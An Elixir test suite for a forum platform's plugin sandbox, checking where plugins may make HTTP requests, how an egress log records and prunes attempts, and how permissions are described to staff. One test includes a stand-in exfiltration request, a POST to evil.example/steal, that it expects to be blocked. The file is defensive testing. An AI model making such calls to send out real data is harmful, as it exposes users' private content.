defmodule FireflyWeb.PluginNetworkTest do
  use FireflyWeb.ConnCase

  @moduletag :capture_log

  import Ecto.Query, only: [from: 2]
  import FireflyPlugins.PluginHelpers

  alias Firefly.{Discussion, Plugins, Repo, SiteSettings}
  alias Firefly.Moderation.{Flags, Review}
  alias Firefly.Rendering.Markdown
  alias Firefly.Discussion.Post
  alias Firefly.Plugin.{Host, Manifest, Runner}
  alias Firefly.Plugins.{Egress, EgressEntry, HTTP, Health}

  @url "http://127.0.0.1:4002/?token=secret"
  @sync_error "permission denied: http.fetch is not available in synchronous hooks"

  # Each hook tries `http.fetch` and answers with the status or the error.
  @source """
  const attempt = () => {
    try { return 'status ' + firefly.call('http.fetch', {url: '#{@url}'}).status }
    catch (e) { return e.message }
  };
  exports.render_shortcodes = () => [attempt()];
  exports.render_post = () => attempt();
  exports.handle_event = () => attempt();
  exports.run_job = () => attempt();
  exports.go = () => attempt();
  """

  @manifest %{
    "id" => "net",
    "name" => "Net",
    "hooks" => ["render_shortcodes", "render_post", "handle_event", "run_job"],
    "shortcodes" => ["net"],
    "exports" => ["go"],
    "permissions" => ["http"],
    "http_hosts" => ["127.0.0.1"]
  }

  setup do
    Application.put_env(:firefly, HTTP, allow_private: true)
    on_exit(fn -> Application.delete_env(:firefly, HTTP) end)
    %{admin: admin_fixture()}
  end

  defp net(admin) do
    install_plugin!(admin, @manifest, %{"index.js" => @source}, enable: true)
    Plugins.get_active("net")
  end

  defp entries, do: Repo.all(from(e in EgressEntry, order_by: e.id))

  describe "http.fetch by hook" do
    test "is refused while rendering content", %{admin: admin} do
      plugin = net(admin)

      for hook <- ["render_shortcodes", "render_post"] do
        assert {:ok, result} = Runner.invoke(plugin, hook, [%{}])
        assert to_string(result) =~ "#{@sync_error} (#{hook}); use an event or job"
      end

      assert [%{blocked: true, error: "sync_hook"}, %{blocked: true, error: "sync_hook"}] =
               entries()

      assert [%{kind: "denied", hook: "http.fetch"} | _] = Health.errors("net")
    end

    test "is refused for a post rendered with plugins", %{admin: admin} do
      net(admin)
      thread = thread_fixture(category_fixture("Public"), user_fixture(), %{body: "Hi"})
      [post] = Repo.preload(thread, :posts).posts

      assert Markdown.render(post.body, nil, post: post, thread: thread) =~
               "not available in synchronous hooks (render_post)"

      assert [%{host: "127.0.0.1", blocked: true, error: "sync_hook"}] = entries()
    end

    test "works in background hooks", %{admin: admin} do
      plugin = net(admin)

      for hook <- ["handle_event", "run_job"],
          do: assert({:ok, "status 200"} = Runner.invoke(plugin, hook, [%{}]))

      assert [%{blocked: false, status: 200}, %{blocked: false, status: 200}] = entries()
    end

    test "in an export, depends on where the call chain started", %{admin: admin} do
      net(admin)

      install_plugin!(
        admin,
        %{
          "id" => "relay",
          "name" => "Relay",
          "hooks" => ["render_post", "run_job"],
          "dependencies" => %{"net" => "~> 1.0"}
        },
        %{
          "index.js" => """
          const relay = () => firefly.call('plugins.call', {plugin: 'net', function: 'go', args: null});
          exports.render_post = relay;
          exports.run_job = relay;
          """
        },
        enable: true
      )

      relay = Plugins.get_active("relay")
      assert {:ok, "status 200"} = Runner.invoke(relay, "run_job", [%{}])
      assert {:ok, render} = Runner.invoke(relay, "render_post", [%{}])
      assert render =~ "#{@sync_error} (render_post)"

      # Called from Elixir rather than from a hook: no network.
      assert {:ok, direct} = Runner.invoke(Plugins.get_active("net"), "call_export", ["go", nil])
      assert direct =~ "#{@sync_error} (call_export)"
    end

    test "is refused while moderating posts and flags", %{admin: admin} do
      install_plugin!(
        admin,
        %{
          "id" => "checker",
          "name" => "Checker",
          "hooks" => ["moderate_post", "flag_created"],
          "permissions" => ["read", "flag", "http"],
          "http_hosts" => ["127.0.0.1"]
        },
        %{
          "index.js" => """
          const attempt = () => {
            try { firefly.call('http.fetch', {url: '#{@url}'}); return null }
            catch (e) { return e.message }
          };
          // Can't ask the remote service: queue for staff, saying why.
          exports.moderate_post = () => {
            const refused = attempt();
            return refused ? {action: 'queue', reason: refused} : {action: 'allow'};
          };
          // Hides the post only when the fetch was refused, so the test sees it.
          exports.flag_created = () => ({action: attempt() ? 'hide' : 'none'});
          """
        },
        enable: true
      )

      member = user_fixture()
      thread = thread_fixture(category_fixture("Public"), admin, %{body: "Hi"})
      {:ok, post} = Discussion.create_post(thread, member, %{body: "check me"})
      assert post.queued_reason =~ "#{@sync_error} (moderate_post); use an event or job"

      {:ok, approved} = Review.approve(post, admin)
      {:ok, _} = Flags.flag_post(approved, user_fixture(), %{reason: "spam"})
      assert Post.hidden?(Repo.get!(Post, post.id))

      assert [%{error: "sync_hook"}, %{error: "sync_hook"}] = entries()
    end

    test "works on the plugin's own widgets, endpoints and pages", %{admin: admin} do
      hooks = ["handle_widget", "handle_request", "render_page", "render_admin"]

      install_plugin!(
        admin,
        %{
          "id" => "surface",
          "name" => "Surface",
          "hooks" => hooks,
          "permissions" => ["http"],
          "http_hosts" => ["127.0.0.1"]
        },
        %{
          "index.js" =>
            Enum.map_join(hooks, "\n", fn hook ->
              "exports.#{hook} = () => ({status: firefly.call('http.fetch', {url: '#{@url}'}).status});"
            end)
        },
        enable: true
      )

      plugin = Plugins.get_active("surface")

      for hook <- hooks,
          do: assert({:ok, %{"status" => 200}} = Runner.invoke(plugin, hook, [%{}]), hook)

      assert length(entries()) == 4
      assert Enum.all?(entries(), &(&1.status == 200 and not &1.blocked))
    end

    test "applies the same way to core plugins" do
      with_core_plugins([FireflyPlugins.Test.NetCorePlugin], fn ->
        plugin = Plugins.get_active("net-core")
        assert {:ok, %{status: 200}} = Runner.invoke(plugin, "run_job", [%{}])
        assert {:error, message} = Runner.invoke(plugin, "render_post", [%{}])
        assert message =~ "#{@sync_error} (render_post)"

        # Outside any hook (e.g. a process the plugin started itself).
        assert {:error, outside} = Host.call(plugin, "http.fetch", %{"url" => @url})
        assert outside =~ "(outside a hook)"
      end)
    end
  end

  describe "egress log" do
    test "records attempts without bodies, headers or query strings", %{admin: admin} do
      plugin = net(admin)
      assert {:ok, "status 200"} = Runner.invoke(plugin, "run_job", [%{}])

      Runner.put_context("run_job")

      assert {:error, "host evil.example isn't in the plugin's http_hosts"} =
               Host.call(plugin, "http.fetch", %{
                 "url" => "https://evil.example/steal?key=abc",
                 "method" => "post",
                 "body" => "private"
               })

      assert [sent, refused] = entries()

      assert %{
               plugin_id: "net",
               method: "GET",
               host: "127.0.0.1",
               path: "/",
               status: 200,
               error: nil,
               blocked: false,
               request_bytes: 0
             } = sent

      assert sent.response_bytes > 0
      assert sent.duration_ms >= 0

      assert %{
               method: "POST",
               host: "evil.example",
               path: "/steal",
               status: nil,
               error: "host_not_allowed",
               blocked: true,
               request_bytes: 0,
               response_bytes: 0
             } = refused

      refute inspect(entries()) =~ "secret"
      refute inspect(entries()) =~ "private"
    end

    test "records refusals for missing permissions", %{admin: admin} do
      install_plugin!(admin, %{"id" => "quiet", "name" => "Q", "exports" => ["go"]}, nil,
        enable: true
      )

      Runner.put_context("run_job")

      assert {:error, "permission denied: http.fetch needs the \"http\" permission"} =
               Host.call(Plugins.get_active("quiet"), "http.fetch", %{"url" => @url})

      assert [%{plugin_id: "quiet", blocked: true, error: "no_permission"}] = entries()
    end

    test "is pruned after the retention period", %{admin: admin} do
      plugin = net(admin)
      assert {:ok, "status 200"} = Runner.invoke(plugin, "run_job", [%{}])
      assert SiteSettings.get("plugin_egress_days") == 14

      assert Egress.run_due(DateTime.add(DateTime.utc_now(), 13, :day)) == 0
      assert Egress.run_due(DateTime.add(DateTime.utc_now(), 15, :day)) == 1
      assert entries() == []

      {:ok, _} = SiteSettings.update(%{"plugin_egress_days" => "1"}, admin)
      assert {:ok, "status 200"} = Runner.invoke(plugin, "run_job", [%{}])
      assert Egress.run_due(DateTime.add(DateTime.utc_now(), 2, :day)) == 1
    end

    test "is listed on the plugin's page, filtered by host and outcome", %{
      conn: conn,
      admin: admin
    } do
      plugin = net(admin)
      assert {:ok, "status 200"} = Runner.invoke(plugin, "run_job", [%{}])
      assert {:ok, _} = Runner.invoke(plugin, "render_post", [%{}])

      Egress.record("net", %{"url" => "https://api.example.com/v1"}, {:error, :timeout, "x"}, 5)

      conn
      |> log_in_as(admin)
      |> visit(~p"/staff/plugins/net")
      |> assert_has("#egress-log tbody tr", count: 3)
      |> assert_has("#egress-log", text: "GET 127.0.0.1/")
      |> assert_has("#egress-log", text: "blocked: sync_hook")
      |> refute_has("#egress-log", text: "token")
      |> select("Outcome", option: "Blocked")
      |> assert_has("#egress-log tbody tr", count: 1)
      |> select("Outcome", option: "Allowed")
      |> assert_has("#egress-log tbody tr", count: 2)
      |> select("Host", option: "api.example.com")
      |> assert_has("#egress-log tbody tr", count: 1)
      |> assert_has("#egress-log", text: "timeout")
    end
  end

  describe "permissions in plain words" do
    defp manifest(attrs) do
      {:ok, manifest} =
        Manifest.parse(
          Map.merge(
            %{"id" => "pp", "name" => "P", "version" => "1.0.0", "firefly" => "~> 1.0"},
            attrs
          ),
          "upload"
        )

      manifest
    end

    test "http names its hosts; upgrades mark what's new" do
      old = manifest(%{"permissions" => ["http"], "http_hosts" => ["api.example.com"]})

      new =
        manifest(%{
          "permissions" => ["http", "post"],
          "http_hosts" => ["api.example.com", "hooks.slack.com", "*.example.org"]
        })

      assert Host.describe_permission("http", new) ==
               "Can send forum content to: api.example.com, hooks.slack.com, any subdomain of example.org"

      for permission <- Host.permissions(),
          do: assert(Host.describe_permission(permission, new) =~ ~r/^Can /)

      assert [
               %{permission: "http", new: false, hosts: hosts},
               %{permission: "post", new: true, hosts: []}
             ] = Host.permission_summary(new, old)

      assert [
               %{name: "api.example.com", new: false},
               %{name: "hooks.slack.com", new: true},
               %{name: "any subdomain of example.org", new: true}
             ] = hosts

      assert Host.more_access?(new, old)
      refute Host.more_access?(old, new)
      refute Host.more_access?(old, old)
      assert Enum.all?(Host.permission_summary(new), &(not &1.new))
    end
  end
end

defmodule FireflyPlugins.Test.NetCorePlugin do
  @moduledoc "A core plugin for tests that fetches from its hooks."
  use Firefly.Plugin,
    id: "net-core",
    name: "Net core",
    version: "1.0.0",
    firefly: "~> 1.0",
    permissions: ["http"],
    http_hosts: ["127.0.0.1"]

  alias Firefly.Plugin.Host

  @impl true
  def render_post(plugin, _input), do: fetch(plugin)

  @impl true
  def run_job(plugin, _input), do: fetch(plugin)

  defp fetch(plugin), do: Host.call(plugin, "http.fetch", %{"url" => "http://127.0.0.1:4002/"})
end
